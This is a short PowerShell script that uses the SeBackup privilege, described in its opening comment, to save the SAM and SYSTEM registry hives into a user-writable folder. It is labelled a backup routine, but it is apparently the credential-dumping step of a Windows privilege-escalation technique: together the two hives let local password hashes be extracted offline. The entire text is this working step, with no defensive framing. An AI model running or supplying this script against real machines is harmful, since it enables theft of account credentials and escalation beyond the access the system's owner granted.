# SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.
# Define the backup directory based on the current user
$backupDir = "C:\Users\$env:USERNAME\Backup"

# Ensure backup directory exists
if (-not (Test-Path $backupDir)) {
    New-Item -Path $backupDir -ItemType Directory -Force
}

# Define the registry hives and their backup paths
$registryHives = @{
    "hklm\system" = "$backupDir\system.hive"
    "hklm\sam"    = "$backupDir\sam.hive"
}

# Loop through each hive and perform the backup
foreach ($hive in $registryHives.GetEnumerator()) {
    try {
        # Execute the reg save command
        $output = & reg save $hive.Key $hive.Value 2>&1
        if ($LASTEXITCODE -eq 0) {
            Write-Host "Successfully backed up $($hive.Key) to $($hive.Value)"
        } else {
            Write-Warning "Failed to backup $($hive.Key). Exit Code: $LASTEXITCODE"
        }
    } catch {
        Write-Error "An error occurred while backing up $($hive.Key): $_"
    }
}
